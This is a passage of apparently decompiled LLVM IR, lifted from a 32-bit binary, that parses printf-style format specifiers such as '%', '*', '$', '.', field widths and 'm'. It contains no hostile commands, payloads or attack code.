  store i32 0, i32* %r5.global-to-local, align 4
  store i32 0, i32* @r29, align 4
  store i32 ptrtoint ([29 x i8]* @global_var_10030000.14 to i32), i32* @r27, align 4
  store i32 %v2_1001b044.pre-phi, i32* %r3.global-to-local, align 4
  store i32 268697600, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1001b054

dec_label_pc_1001b050:                            ; preds = %dec_label_pc_1001b160, %dec_label_pc_1001b1e4
  %v0_1001b050 = phi i32 [ %v1_1001b1e4, %dec_label_pc_1001b1e4 ], [ %v0_1001b148, %dec_label_pc_1001b160 ]
  %stack_var_-84.0 = phi i32 [ %stack_var_-84.3, %dec_label_pc_1001b1e4 ], [ %stack_var_-84.2, %dec_label_pc_1001b160 ]
  store i32 %v0_1001b050, i32* @r10, align 4
  br label %dec_label_pc_1001b054

dec_label_pc_1001b054:                            ; preds = %dec_label_pc_1001b034, %dec_label_pc_1001b050
  %v0_1001b068 = phi i32 [ %storemerge3, %dec_label_pc_1001b034 ], [ %v0_1001b050, %dec_label_pc_1001b050 ]
  %stack_var_-84.1 = phi i32 [ %tmp46, %dec_label_pc_1001b034 ], [ %stack_var_-84.0, %dec_label_pc_1001b050 ]
  %v1_1001b054 = inttoptr i32 %v0_1001b068 to i8*
  %v2_1001b054 = load i8, i8* %v1_1001b054, align 1
  %v3_1001b054 = zext i8 %v2_1001b054 to i32
  store i32 %v3_1001b054, i32* %r0.global-to-local, align 4
  store i32 %v0_1001b068, i32* @r30, align 4
  %v3_1001b05c = icmp eq i8 %v2_1001b054, 42
  br i1 %v3_1001b05c, label %dec_label_pc_1001b064, label %dec_label_pc_1001b074

dec_label_pc_1001b064:                            ; preds = %dec_label_pc_1001b054
  %v0_1001b064 = load i32, i32* %r5.global-to-local, align 4
  %v1_1001b064 = mul i32 %v0_1001b064, -4
  store i32 %v1_1001b064, i32* %r0.global-to-local, align 4
  %v1_1001b068 = add i32 %v0_1001b068, 1
  store i32 %v1_1001b068, i32* @r30, align 4
  %v0_1001b06c = load i32, i32* @r1, align 4
  %v2_1001b06c = add i32 %v0_1001b06c, %v1_1001b064
  store i32 %v2_1001b06c, i32* %r9.global-to-local, align 4
  %v0_1001b070 = load i32, i32* @r29, align 4
  %v2_1001b070 = add i32 %v2_1001b06c, 8
  %v3_1001b070 = inttoptr i32 %v2_1001b070 to i32*
  store i32 %v0_1001b070, i32* %v3_1001b070, align 4
  %v0_1001b08c.pre.pre = load i32, i32* @r30, align 4
  br label %dec_label_pc_1001b074

dec_label_pc_1001b074:                            ; preds = %dec_label_pc_1001b054, %dec_label_pc_1001b064
  %v0_1001b08c.pre = phi i32 [ %v0_1001b068, %dec_label_pc_1001b054 ], [ %v0_1001b08c.pre.pre, %dec_label_pc_1001b064 ]
  %v0_1001b074 = load i32, i32* %r4.global-to-local, align 4
  %v1_1001b074 = add i32 %v0_1001b074, 20828
  %v2_1001b074 = inttoptr i32 %v1_1001b074 to i32*
  %v3_1001b074 = load i32, i32* %v2_1001b074, align 4
  store i32 %v3_1001b074, i32* %r7.global-to-local, align 4
  store i32 0, i32* @r8, align 4
  br label %dec_label_pc_1001b08c

dec_label_pc_1001b080:                            ; preds = %dec_label_pc_1001b08c
  %v2_1001b090 = icmp sgt i32 %v0_1001b0d8, 4094
  br i1 %v2_1001b090, label %dec_label_pc_1001b088, label %dec_label_pc_1001b084

dec_label_pc_1001b084:                            ; preds = %dec_label_pc_1001b080
  %v1_1001b084 = add i32 %v2_1001b0a4, -48
  store i32 %v1_1001b084, i32* @r8, align 4
  br label %dec_label_pc_1001b088

dec_label_pc_1001b088:                            ; preds = %dec_label_pc_1001b080, %dec_label_pc_1001b084
  %v0_1001b09015 = phi i32 [ %v0_1001b0d8, %dec_label_pc_1001b080 ], [ %v1_1001b084, %dec_label_pc_1001b084 ]
  %v1_1001b088 = add i32 %v0_1001b108, 1
  store i32 %v1_1001b088, i32* @r30, align 4
  br label %dec_label_pc_1001b08c

dec_label_pc_1001b08c:                            ; preds = %dec_label_pc_1001b074, %dec_label_pc_1001b088
  %v0_1001b0d8 = phi i32 [ 0, %dec_label_pc_1001b074 ], [ %v0_1001b09015, %dec_label_pc_1001b088 ]
  %v0_1001b108 = phi i32 [ %v0_1001b08c.pre, %dec_label_pc_1001b074 ], [ %v1_1001b088, %dec_label_pc_1001b088 ]
  %v1_1001b08c = inttoptr i32 %v0_1001b108 to i8*
  %v2_1001b08c = load i8, i8* %v1_1001b08c, align 1
  %v3_1001b08c = zext i8 %v2_1001b08c to i32
  store i32 %v3_1001b08c, i32* @r11, align 4
  %v1_1001b094 = mul nuw nsw i32 %v3_1001b08c, 2
  store i32 %v1_1001b094, i32* %r9.global-to-local, align 4
  %v2_1001b098 = add i32 %v1_1001b094, %v3_1001b074
  %v3_1001b098 = inttoptr i32 %v2_1001b098 to i16*
  %v4_1001b098 = load i16, i16* %v3_1001b098, align 2
  %v5_1001b098 = zext i16 %v4_1001b098 to i32
  store i32 %v5_1001b098, i32* %r0.global-to-local, align 4
  %v1_1001b09c = mul i32 %v0_1001b0d8, 10
  %v1_1001b0a0 = and i32 %v5_1001b098, 8
  store i32 %v1_1001b0a0, i32* @r25, align 4
  %v3_1001b0a0 = icmp eq i32 %v1_1001b0a0, 0
  %v2_1001b0a4 = add i32 %v3_1001b08c, %v1_1001b09c
  store i32 %v2_1001b0a4, i32* %r9.global-to-local, align 4
  br i1 %v3_1001b0a0, label %dec_label_pc_1001b0ac, label %dec_label_pc_1001b080

dec_label_pc_1001b0ac:                            ; preds = %dec_label_pc_1001b08c
  %v0_1001b0ac = load i32, i32* @r10, align 4
  %v1_1001b0ac = add i32 %v0_1001b0ac, -1
  %v2_1001b0ac = inttoptr i32 %v1_1001b0ac to i8*
  %v3_1001b0ac = load i8, i8* %v2_1001b0ac, align 1
  %v4_1001b0ac = zext i8 %v3_1001b0ac to i32
  store i32 %v4_1001b0ac, i32* %r0.global-to-local, align 4
  %v3_1001b0b0 = icmp eq i8 %v3_1001b0ac, 37
  br i1 %v3_1001b0b0, label %dec_label_pc_1001b0b8, label %dec_label_pc_1001b180

dec_label_pc_1001b0b8:                            ; preds = %dec_label_pc_1001b0ac
  %v3_1001b0b8 = icmp eq i8 %v2_1001b08c, 36
  br i1 %v3_1001b0b8, label %dec_label_pc_1001b0c0, label %dec_label_pc_1001b0f4

dec_label_pc_1001b0c0:                            ; preds = %dec_label_pc_1001b0b8
  %tmp58 = icmp slt i32 %v0_1001b0d8, 1
  br i1 %tmp58, label %dec_label_pc_1001b0f4, label %dec_label_pc_1001b0c8

dec_label_pc_1001b0c8:                            ; preds = %dec_label_pc_1001b0c0
  %v0_1001b0c8 = load i32, i32* @r26, align 4
  %v3_1001b0c8 = icmp eq i32 %v0_1001b0c8, 0
  %v1_1001b0cc = add i32 %v0_1001b108, 1
  store i32 %v1_1001b0cc, i32* @r10, align 4
  br i1 %v3_1001b0c8, label %dec_label_pc_1001b490, label %dec_label_pc_1001b0d4

dec_label_pc_1001b0d4:                            ; preds = %dec_label_pc_1001b0c8
  %v3_1001b0d4 = icmp sgt i32 %v0_1001b0d8, %v0_1001b0c8
  br i1 %v3_1001b0d4, label %dec_label_pc_1001b0e0, label %dec_label_pc_1001b0ec

dec_label_pc_1001b0e0:                            ; preds = %dec_label_pc_1001b0d4
  store i32 %v0_1001b0d8, i32* @r26, align 4
  br label %dec_label_pc_1001b0ec

dec_label_pc_1001b0e8:                            ; preds = %dec_label_pc_1001b110, %dec_label_pc_1001b108
  store i32 0, i32* @r26, align 4
  br label %dec_label_pc_1001b0ec

dec_label_pc_1001b0ec:                            ; preds = %dec_label_pc_1001b0d4, %dec_label_pc_1001b0e0, %dec_label_pc_1001b0e8
  %v0_1001b0ec = phi i32 [ %v0_1001b0ac, %dec_label_pc_1001b0e8 ], [ %v1_1001b0cc, %dec_label_pc_1001b0e0 ], [ %v1_1001b0cc, %dec_label_pc_1001b0d4 ]
  %stack_var_-84.2 = phi i32 [ %stack_var_-84.1, %dec_label_pc_1001b0e8 ], [ %v0_1001b0d8, %dec_label_pc_1001b0e0 ], [ %v0_1001b0d8, %dec_label_pc_1001b0d4 ]
  br label %dec_label_pc_1001b128

dec_label_pc_1001b0f4:                            ; preds = %dec_label_pc_1001b0b8, %dec_label_pc_1001b0c0
  %v0_1001b0f4 = load i32, i32* @r26, align 4
  %tmp59 = icmp slt i32 %v0_1001b0f4, 1
  br i1 %tmp59, label %dec_label_pc_1001b108, label %dec_label_pc_1001b0fc

dec_label_pc_1001b0fc:                            ; preds = %dec_label_pc_1001b0f4
  %v3_1001b0fc = icmp eq i8 %v2_1001b08c, 109
  br i1 %v3_1001b0fc, label %dec_label_pc_1001b180, label %dec_label_pc_1001b490

dec_label_pc_1001b108:                            ; preds = %dec_label_pc_1001b0f4
  %v3_1001b108 = icmp ugt i32 %v0_1001b108, %v0_1001b0ac
  br i1 %v3_1001b108, label %dec_label_pc_1001b110, label %dec_label_pc_1001b0e8

dec_label_pc_1001b110:                            ; preds = %dec_label_pc_1001b108
  %v1_1001b110 = inttoptr i32 %v0_1001b0ac to i8*
  %v2_1001b110 = load i8, i8* %v1_1001b110, align 1
  %v3_1001b110 = zext i8 %v2_1001b110 to i32
  store i32 %v3_1001b110, i32* %r0.global-to-local, align 4
  store i32 %v0_1001b0ac, i32* @r11, align 4
  store i32 0, i32* @r26, align 4
  %v3_1001b11c = icmp eq i8 %v2_1001b110, 48
  br i1 %v3_1001b11c, label %dec_label_pc_1001b0e8, label %dec_label_pc_1001b184

dec_label_pc_1001b128:                            ; preds = %dec_label_pc_1001b144, %dec_label_pc_1001b0ec
  %v0_1001b148 = phi i32 [ %v0_1001b0ec, %dec_label_pc_1001b0ec ], [ %v1_1001b148, %dec_label_pc_1001b144 ]
  store i32 %v0_1001b148, i32* @r30, align 4
  %v1_1001b138 = inttoptr i32 %v0_1001b148 to i8*
  br label %dec_label_pc_1001b130

dec_label_pc_1001b130:                            ; preds = %dec_label_pc_1001b150, %dec_label_pc_1001b128
  %v1_1001b144 = phi i32 [ %v1_1001b154, %dec_label_pc_1001b150 ], [ 1, %dec_label_pc_1001b128 ]
  %v0_1001b130 = phi i32 [ %v1_1001b134, %dec_label_pc_1001b150 ], [ ptrtoint ([8 x i8]* @global_var_1002e484.1172 to i32), %dec_label_pc_1001b128 ]
  %v1_1001b130 = inttoptr i32 %v0_1001b130 to i8*
  %v2_1001b130 = load i8, i8* %v1_1001b130, align 1
  %v3_1001b130 = zext i8 %v2_1001b130 to i32
  store i32 %v3_1001b130, i32* %r9.global-to-local, align 4
  %v1_1001b134 = add i32 %v0_1001b130, 1
  store i32 %v1_1001b134, i32* @r11, align 4
  %v2_1001b138 = load i8, i8* %v1_1001b138, align 1
  %v3_1001b138 = zext i8 %v2_1001b138 to i32
  store i32 %v3_1001b138, i32* %r0.global-to-local, align 4
  %v4_1001b13c = icmp eq i8 %v2_1001b138, %v2_1001b130
  br i1 %v4_1001b13c, label %dec_label_pc_1001b144, label %dec_label_pc_1001b150

dec_label_pc_1001b144:                            ; preds = %dec_label_pc_1001b130
  %v0_1001b144 = load i32, i32* %r6.global-to-local, align 4
  %v2_1001b144 = or i32 %v0_1001b144, %v1_1001b144
  store i32 %v2_1001b144, i32* %r6.global-to-local, align 4
  %v1_1001b148 = add i32 %v0_1001b148, 1
  br label %dec_label_pc_1001b128

dec_label_pc_1001b150:                            ; preds = %dec_label_pc_1001b130
  %v1_1001b150 = inttoptr i32 %v1_1001b134 to i8*
  %v2_1001b150 = load i8, i8* %v1_1001b150, align 1
  %v3_1001b150 = zext i8 %v2_1001b150 to i32
  store i32 %v3_1001b150, i32* %r0.global-to-local, align 4
  %v1_1001b154 = mul i32 %v1_1001b144, 2
  store i32 %v1_1001b154, i32* @r10, align 4
  %v3_1001b158 = icmp eq i8 %v2_1001b150, 0
  br i1 %v3_1001b158, label %dec_label_pc_1001b160, label %dec_label_pc_1001b130

dec_label_pc_1001b160:                            ; preds = %dec_label_pc_1001b150
  %v1_1001b160 = add i32 %v0_1001b148, -1
  %v2_1001b160 = inttoptr i32 %v1_1001b160 to i8*
  %v3_1001b160 = load i8, i8* %v2_1001b160, align 1
  %v4_1001b160 = zext i8 %v3_1001b160 to i32
  store i32 %v4_1001b160, i32* %r0.global-to-local, align 4
  %v0_1001b164 = load i32, i32* %r6.global-to-local, align 4
  %v1_1001b164 = and i32 %v0_1001b164, 10
  store i32 0, i32* @r8, align 4
  %v3_1001b16c = icmp eq i8 %v3_1001b160, 37
  %v1_1001b170 = udiv i32 %v1_1001b164, 2
  store i32 %v1_1001b170, i32* %r9.global-to-local, align 4
  %v2_1001b174 = sub nuw nsw i32 -1, %v1_1001b170
  %v3_1001b174 = and i32 %v0_1001b164, %v2_1001b174
  store i32 %v3_1001b174, i32* %r6.global-to-local, align 4
  br i1 %v3_1001b16c, label %dec_label_pc_1001b184, label %dec_label_pc_1001b050

dec_label_pc_1001b180:                            ; preds = %dec_label_pc_1001b0ac, %dec_label_pc_1001b0fc
  store i32 %v0_1001b0ac, i32* @r11, align 4
  br label %dec_label_pc_1001b184

dec_label_pc_1001b184:                            ; preds = %dec_label_pc_1001b110, %dec_label_pc_1001b160, %dec_label_pc_1001b180
  %v0_1001b1b8 = phi i32 [ 0, %dec_label_pc_1001b160 ], [ %v0_1001b0d8, %dec_label_pc_1001b110 ], [ %v0_1001b0d8, %dec_label_pc_1001b180 ]
  %v1_1001b1c4 = phi i32 [ %v0_1001b148, %dec_label_pc_1001b160 ], [ %v0_1001b108, %dec_label_pc_1001b110 ], [ %v0_1001b108, %dec_label_pc_1001b180 ]
  %v0_1001b1c0 = phi i32 [ %v1_1001b134, %dec_label_pc_1001b160 ], [ %v0_1001b0ac, %dec_label_pc_1001b110 ], [ %v0_1001b0ac, %dec_label_pc_1001b180 ]
  %stack_var_-84.3 = phi i32 [ %stack_var_-84.2, %dec_label_pc_1001b160 ], [ %stack_var_-84.1, %dec_label_pc_1001b110 ], [ %stack_var_-84.1, %dec_label_pc_1001b180 ]
  %v1_1001b184 = inttoptr i32 %v0_1001b1c0 to i8*
  %v2_1001b184 = load i8, i8* %v1_1001b184, align 1
  %v3_1001b184 = zext i8 %v2_1001b184 to i32
  store i32 %v3_1001b184, i32* %r0.global-to-local, align 4
  %v3_1001b188 = icmp eq i8 %v2_1001b184, 42
  br i1 %v3_1001b188, label %dec_label_pc_1001b190, label %dec_label_pc_1001b1d0

dec_label_pc_1001b190:                            ; preds = %dec_label_pc_1001b184
  %v0_1001b190 = load i32, i32* @r26, align 4
  %v3_1001b190 = icmp eq i32 %v0_1001b190, 0
  br i1 %v3_1001b190, label %dec_label_pc_1001b1c0, label %dec_label_pc_1001b198

dec_label_pc_1001b198:                            ; preds = %dec_label_pc_1001b190
  %v1_1001b198 = inttoptr i32 %v1_1001b1c4 to i8*
  %v2_1001b198 = load i8, i8* %v1_1001b198, align 1
  %v3_1001b198 = zext i8 %v2_1001b198 to i32
  store i32 %v3_1001b198, i32* %r0.global-to-local, align 4
  %v3_1001b19c = icmp eq i8 %v2_1001b198, 36
  br i1 %v3_1001b19c, label %dec_label_pc_1001b1a4, label %dec_label_pc_1001b490

dec_label_pc_1001b1a4:                            ; preds = %dec_label_pc_1001b198
  %tmp60 = icmp slt i32 %v0_1001b1b8, 1
  br i1 %tmp60, label %dec_label_pc_1001b490, label %dec_label_pc_1001b1ac

dec_label_pc_1001b1ac:                            ; preds = %dec_label_pc_1001b1a4
  %v0_1001b1ac = load i32, i32* %r5.global-to-local, align 4
  %v1_1001b1ac = mul i32 %v0_1001b1ac, -4
  %v1_1001b1b0 = add i32 %v1_1001b1c4, 1
  store i32 %v1_1001b1b0, i32* @r30, align 4
  %v0_1001b1b4 = load i32, i32* %r3.global-to-local, align 4
  %v2_1001b1b4 = add i32 %v0_1001b1b4, %v1_1001b1ac
  store i32 %v2_1001b1b4, i32* %r9.global-to-local, align 4
  %v2_1001b1b8 = add i32 %v2_1001b1b4, 12
  %v3_1001b1b8 = inttoptr i32 %v2_1001b1b8 to i32*
  store i32 %v0_1001b1b8, i32* %v3_1001b1b8, align 4
  %v0_1001b1d8.pre.pre = load i32, i32* @r30, align 4
  br label %dec_label_pc_1001b1cc

dec_label_pc_1001b1c0:                            ; preds = %dec_label_pc_1001b190
  %v1_1001b1c0 = add i32 %v0_1001b1c0, 1
  store i32 %v1_1001b1c0, i32* %r0.global-to-local, align 4
  %v4_1001b1c4 = icmp eq i32 %v1_1001b1c0, %v1_1001b1c4
  br i1 %v4_1001b1c4, label %dec_label_pc_1001b1cc, label %dec_label_pc_1001b490

dec_label_pc_1001b1cc:                            ; preds = %dec_label_pc_1001b1c0, %dec_label_pc_1001b1ac
  %v0_1001b1d8.pre = phi i32 [ %v1_1001b1c4, %dec_label_pc_1001b1c0 ], [ %v0_1001b1d8.pre.pre, %dec_label_pc_1001b1ac ]
  store i32 -2147483648, i32* @r8, align 4
  br label %dec_label_pc_1001b1d0

dec_label_pc_1001b1d0:                            ; preds = %dec_label_pc_1001b184, %dec_label_pc_1001b1cc
  %v0_1001b1d8 = phi i32 [ %v1_1001b1c4, %dec_label_pc_1001b184 ], [ %v0_1001b1d8.pre, %dec_label_pc_1001b1cc ]
  %v0_1001b1e8 = phi i32 [ %v0_1001b1b8, %dec_label_pc_1001b184 ], [ -2147483648, %dec_label_pc_1001b1cc ]
  %v0_1001b1d0 = load i32, i32* %r5.global-to-local, align 4
  %v3_1001b1d0 = icmp eq i32 %v0_1001b1d0, 0
  %v1_1001b1d8 = inttoptr i32 %v0_1001b1d8 to i8*
  br i1 %v3_1001b1d0, label %dec_label_pc_1001b1d8, label %dec_label_pc_1001b1fc

dec_label_pc_1001b1d8:                            ; preds = %dec_label_pc_1001b1d0
  %v2_1001b1d8 = load i8, i8* %v1_1001b1d8, align 1
  %v3_1001b1d8 = zext i8 %v2_1001b1d8 to i32
  store i32 %v3_1001b1d8, i32* %r0.global-to-local, align 4
  %v3_1001b1dc = icmp eq i8 %v2_1001b1d8, 46
  br i1 %v3_1001b1dc, label %dec_label_pc_1001b1e4, label %dec_label_pc_1001b1f4

dec_label_pc_1001b1e4:                            ; preds = %dec_label_pc_1001b1d8
  %v1_1001b1e4 = add i32 %v0_1001b1d8, 1
  store i32 %v0_1001b1e8, i32* @r31, align 4
  store i32 -1, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_1001b050

dec_label_pc_1001b1f4:                            ; preds = %dec_label_pc_1001b1d8
  store i32 %v0_1001b1e8, i32* @r31, align 4
  br label %dec_label_pc_1001b1fc

dec_label_pc_1001b1fc:                            ; preds = %dec_label_pc_1001b1d0, %dec_label_pc_1001b1f4
  %storemerge1 = phi i32 [ -1, %dec_label_pc_1001b1f4 ], [ %v0_1001b1e8, %dec_label_pc_1001b1d0 ]
  store i32 %storemerge1, i32* %r4.global-to-local, align 4
  store i32 ptrtoint ([29 x i8]* @global_var_10030000.14 to i32), i32* %r9.global-to-local, align 4
  %v2_1001b200 = load i8, i8* %v1_1001b1d8, align 1
  store i32 ptrtoint ([9 x i8]* @global_var_1002e42c.1173 to i32), i32* @r11, align 4
  br label %dec_label_pc_1001b208

dec_label_pc_1001b208:                            ; preds = %dec_label_pc_1001b214, %dec_label_pc_1001b1fc
  %v0_1001b214 = phi i32 [ %v1_1001b214, %dec_label_pc_1001b214 ], [ ptrtoint ([9 x i8]* @global_var_1002e42c.1173 to i32), %dec_label_pc_1001b1fc ]
  %v1_1001b208 = inttoptr i32 %v0_1001b214 to i8*
  %v2_1001b208 = load i8, i8* %v1_1001b208, align 1
  %v3_1001b208 = zext i8 %v2_1001b208 to i32
  store i32 %v3_1001b208, i32* %r0.global-to-local, align 4
  %v4_1001b20c = icmp eq i8 %v2_1001b200, %v2_1001b208
  br i1 %v4_1001b20c, label %dec_label_pc_1001afd8, label %dec_label_pc_1001b214

dec_label_pc_1001b214:                            ; preds = %dec_label_pc_1001b208
  %v1_1001b214 = add i32 %v0_1001b214, 1
  %v2_1001b214 = inttoptr i32 %v1_1001b214 to i8*
  %v3_1001b214 = load i8, i8* %v2_1001b214, align 1
  %v4_1001b214 = zext i8 %v3_1001b214 to i32
  store i32 %v4_1001b214, i32* %r0.global-to-local, align 4
  store i32 %v1_1001b214, i32* @r11, align 4
  %v3_1001b218 = icmp eq i8 %v3_1001b214, 0
  br i1 %v3_1001b218, label %dec_label_pc_1001b220, label %dec_label_pc_1001b208

dec_label_pc_1001b220:                            ; preds = %dec_label_pc_1001b214, %dec_label_pc_1001afd8
  %v0_1001b248 = phi i32 [ %v1_1001afd8, %dec_label_pc_1001afd8 ], [ %v0_1001b1d8, %dec_label_pc_1001b214 ]
  %v0_1001b244 = phi i32 [ %v0_1001b214, %dec_label_pc_1001afd8 ], [ %v1_1001b214, %dec_label_pc_1001b214 ]
  %v2_1001b228 = sub i32 %v0_1001b244, ptrtoint ([9 x i8]* @global_var_1002e42c.1173 to i32)
  store i32 %v2_1001b228, i32* %r9.global-to-local, align 4
  %v2_1001b22c = icmp sgt i32 %v2_1001b228, 1
  br i1 %v2_1001b22c, label %dec_label_pc_1001b24c, label %dec_label_pc_1001b234

dec_label_pc_1001b234:                            ; preds = %dec_label_pc_1001b220
  %v1_1001b234 = inttoptr i32 %v0_1001b248 to i8*
  %v2_1001b234 = load i8, i8* %v1_1001b234, align 1
  %v3_1001b234 = zext i8 %v2_1001b234 to i32
  store i32 %v3_1001b234, i32* %r0.global-to-local, align 4
  %v1_1001b238 = inttoptr i32 %v0_1001b244 to i8*
  %v2_1001b238 = load i8, i8* %v1_1001b238, align 1
  %v3_1001b238 = zext i8 %v2_1001b238 to i32
  store i32 %v3_1001b238, i32* %r9.global-to-local, align 4
  %v4_1001b23c = icmp eq i8 %v2_1001b234, %v2_1001b238
  br i1 %v4_1001b23c, label %dec_label_pc_1001b244, label %dec_label_pc_1001b24c

dec_label_pc_1001b244:                            ; preds = %dec_label_pc_1001b234
  %v1_1001b244 = add i32 %v0_1001b244, 9
  store i32 %v1_1001b244, i32* @r11, align 4
  %v1_1001b248 = add i32 %v0_1001b248, 1
  store i32 %v1_1001b248, i32* @r30, align 4
  br label %dec_label_pc_1001b24c

dec_label_pc_1001b24c:                            ; preds = %dec_label_pc_1001b234, %dec_label_pc_1001b220, %dec_label_pc_1001b244
  %v0_1001b250 = phi i32 [ %v0_1001b244, %dec_label_pc_1001b234 ], [ %v0_1001b244, %dec_label_pc_1001b220 ], [ %v1_1001b244, %dec_label_pc_1001b244 ]
  %v0_1001b24c = phi i32 [ %v0_1001b248, %dec_label_pc_1001b234 ], [ %v0_1001b248, %dec_label_pc_1001b220 ], [ %v1_1001b248, %dec_label_pc_1001b244 ]
  %v1_1001b24c = inttoptr i32 %v0_1001b24c to i8*
  %v2_1001b24c = load i8, i8* %v1_1001b24c, align 1
  %v3_1001b24c = zext i8 %v2_1001b24c to i32
  store i32 %v3_1001b24c, i32* %r7.global-to-local, align 4
  %v1_1001b250 = add i32 %v0_1001b250, 9
  %v2_1001b250 = inttoptr i32 %v1_1001b250 to i8*
  %v3_1001b250 = load i8, i8* %v2_1001b250, align 1
  %v4_1001b250 = zext i8 %v3_1001b250 to i32
  store i32 %v4_1001b250, i32* %r0.global-to-local, align 4
  %v3_1001b254 = icmp eq i8 %v2_1001b24c, 0
  %v1_1001b258 = mul nuw nsw i32 %v4_1001b250, 256
  store i32 %v1_1001b258, i32* @r10, align 4
  br i1 %v3_1001b254, label %dec_label_pc_1001b490, label %dec_label_pc_1001b260

dec_label_pc_1001b260:                            ; preds = %dec_label_pc_1001b24c
  %v1_1001b264 = and i32 %v1_1001b258, 1024
  store i32 %v1_1001b264, i32* %r0.global-to-local, align 4
  %v3_1001b264 = icmp eq i32 %v1_1001b264, 0
  store i32 ptrtoint ([29 x i8]* @global_var_10030000.14 to i32), i32* %r3.global-to-local, align 4
  %v3_1001b270 = load i32, i32* %stack_var_-96, align 4
  store i32 ptrtoint (i32* @global_var_1002e460.1175 to i32), i32* %r5.global-to-local, align 4
  store i32 ptrtoint ([21 x i8]* @global_var_1002e46c.1174 to i32), i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1001b280

dec_label_pc_1001b280:                            ; preds = %dec_label_pc_1001b2e4, %dec_label_pc_1001b260
  %v1_1001b28c = phi i32 [ %v1_1001b2e4, %dec_label_pc_1001b2e4 ], [ ptrtoint ([21 x i8]* @global_var_1002e46c.1174 to i32), %dec_label_pc_1001b260 ]
  %v1_1001b280 = inttoptr i32 %v1_1001b28c to i8*
  %v2_1001b280 = load i8, i8* %v1_1001b280, align 1
  %v3_1001b280 = zext i8 %v2_1001b280 to i32
  store i32 %v3_1001b280, i32* %r0.global-to-local, align 4
  %v4_1001b284 = icmp eq i8 %v2_1001b280, %v2_1001b24c
  br i1 %v4_1001b284, label %dec_label_pc_1001b28c, label %dec_label_pc_1001b2e4

dec_label_pc_1001b28c:                            ; preds = %dec_label_pc_1001b280
  %v2_1001b28c = sub i32 %v1_1001b28c, ptrtoint ([21 x i8]* @global_var_1002e46c.1174 to i32)
  %tmp61 = icmp slt i32 %v2_1001b28c, 18
  %brmerge = or i1 %v3_1001b264, %tmp61
  br i1 %brmerge, label %dec_label_pc_1001b2a0, label %dec_label_pc_1001b29c

dec_label_pc_1001b29c:                            ; preds = %dec_label_pc_1001b28c
  %v1_1001b29c = add i32 %v2_1001b28c, -2
  br label %dec_label_pc_1001b2a0

dec_label_pc_1001b2a0:                            ; preds = %dec_label_pc_1001b28c, %dec_label_pc_1001b29c
  %storemerge = phi i32 [ %v1_1001b29c, %dec_label_pc_1001b29c ], [ %v2_1001b28c, %dec_label_pc_1001b28c ]
  %v0_1001b2a0 = phi i32 [ %v1_1001b29c, %dec_label_pc_1001b29c ], [ %v2_1001b28c, %dec_label_pc_1001b28c ]
  store i32 %storemerge, i32* %r9.global-to-local, align 4
  %v1_1001b2a0 = load i32, i32* @r28, align 4
  %v2_1001b2a0 = add i32 %v1_1001b2a0, 32
  %v3_1001b2a0 = inttoptr i32 %v2_1001b2a0 to i32*
  store i32 %v0_1001b2a0, i32* %v3_1001b2a0, align 4
  %v0_1001b2ac.pre = load i32, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1001b2a8

dec_label_pc_1001b2a8:                            ; preds = %dec_label_pc_1001b2a8, %dec_label_pc_1001b2a0
  %v0_1001b2a8 = phi i32 [ %v1_1001b2a8, %dec_label_pc_1001b2a8 ], [ ptrtoint (i32* @global_var_1002e45f.1176 to i32), %dec_label_pc_1001b2a0 ]
  %v1_1001b2a8 = add i32 %v0_1001b2a8, 1
  %v2_1001b2a8 = inttoptr i32 %v1_1001b2a8 to i8*
  %v3_1001b2a8 = load i8, i8* %v2_1001b2a8, align 1
  %v4_1001b2a8 = zext i8 %v3_1001b2a8 to i32
  store i32 %v4_1001b2a8, i32* %r0.global-to-local, align 4
  %v3_1001b2ac = icmp sgt i32 %v0_1001b2ac.pre, %v4_1001b2a8
  br i1 %v3_1001b2ac, label %dec_label_pc_1001b2a8, label %dec_label_pc_1001b2b4

dec_label_pc_1001b2b4:                            ; preds = %dec_label_pc_1001b2a8
  %v0_1001b2b4 = load i32, i32* %r5.global-to-local, align 4
  %v2_1001b2b4 = sub i32 %v1_1001b2a8, %v0_1001b2b4
  %v1_1001b2bc = mul i32 %v2_1001b2b4, 2
  store i32 ptrtoint (i32* @global_var_1002e450.1177 to i32), i32* %r9.global-to-local, align 4
  %v2_1001b2c4 = add i32 %v1_1001b2bc, ptrtoint (i32* @global_var_1002e450.1177 to i32)
  %v3_1001b2c4 = inttoptr i32 %v2_1001b2c4 to i16*
  %v4_1001b2c4 = load i16, i16* %v3_1001b2c4, align 2
  %v5_1001b2c4 = sext i16 %v4_1001b2c4 to i32
  store i32 %v5_1001b2c4, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1002e440.1178 to i32), i32* %r9.global-to-local, align 4
  store i32 ptrtoint ([21 x i8]* @global_var_1002e46c.1174 to i32), i32* @r8, align 4
  %v2_1001b2d4 = add i32 %v1_1001b2bc, ptrtoint (i32* @global_var_1002e440.1178 to i32)
  %v3_1001b2d4 = inttoptr i32 %v2_1001b2d4 to i16*
  %v4_1001b2d4 = load i16, i16* %v3_1001b2d4, align 2
  %v5_1001b2d4 = sext i16 %v4_1001b2d4 to i32
  store i32 %v5_1001b2d4, i32* %r9.global-to-local, align 4
  %v2_1001b2d8 = or i32 %v5_1001b2c4, %v1_1001b258
  store i32 %v2_1001b2d8, i32* %r0.global-to-local, align 4
  %v2_1001b2dc = and i32 %v5_1001b2d4, %v2_1001b2d8
  br label %dec_label_pc_1001b2f0

dec_label_pc_1001b2e4:                            ; preds = %dec_label_pc_1001b280
  %v1_1001b2e4 = add i32 %v1_1001b28c, 1
  %v2_1001b2e4 = inttoptr i32 %v1_1001b2e4 to i8*
  %v3_1001b2e4 = load i8, i8* %v2_1001b2e4, align 1
  %v4_1001b2e4 = zext i8 %v3_1001b2e4 to i32
  store i32 %v4_1001b2e4, i32* %r0.global-to-local, align 4
  store i32 %v1_1001b2e4, i32* @r8, align 4
  %v3_1001b2e8 = icmp eq i8 %v3_1001b2e4, 0
  br i1 %v3_1001b2e8, label %dec_label_pc_1001b2f0, label %dec_label_pc_1001b280

dec_label_pc_1001b2f0:                            ; preds = %dec_label_pc_1001b2e4, %dec_label_pc_1001b2b4
  %v0_1001b2f0 = phi i32 [ %v2_1001b2dc, %dec_label_pc_1001b2b4 ], [ %v3_1001b270, %dec_label_pc_1001b2e4 ]
  store i32 %v0_1001b2f0, i32* %stack_var_-96, align 4
  %v0_1001b2f4 = load i32, i32* %r6.global-to-local, align 4
